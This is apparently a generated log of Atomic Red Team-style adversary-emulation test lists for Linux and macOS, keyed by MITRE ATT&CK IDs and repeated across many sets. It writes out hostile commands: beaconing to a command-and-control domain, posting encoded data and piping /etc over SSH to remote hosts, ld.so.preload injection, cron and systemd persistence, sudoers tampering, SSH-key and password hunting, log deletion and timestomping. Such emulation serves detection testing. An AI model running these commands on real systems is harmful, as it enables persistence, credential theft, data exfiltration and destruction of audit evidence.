T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1501 ,T1154 ,T1145 ,T1083 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1501 ,T1154 ,T1040 ,T1217 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1064 ,T1040 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1136 ,T1064 ,T1139 ,T1083 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1154 ,T1040 ,T1082 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1168 ,T1154 ,T1040 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1153 ,T1081 ,T1217 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1154 ,T1139 ,T1135 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1215 ,T1064 ,T1145 ,T1083 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1154 ,T1145 ,T1201 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1064 ,T1139 ,T1069 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1136 ,T1153 ,T1145 ,T1217 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
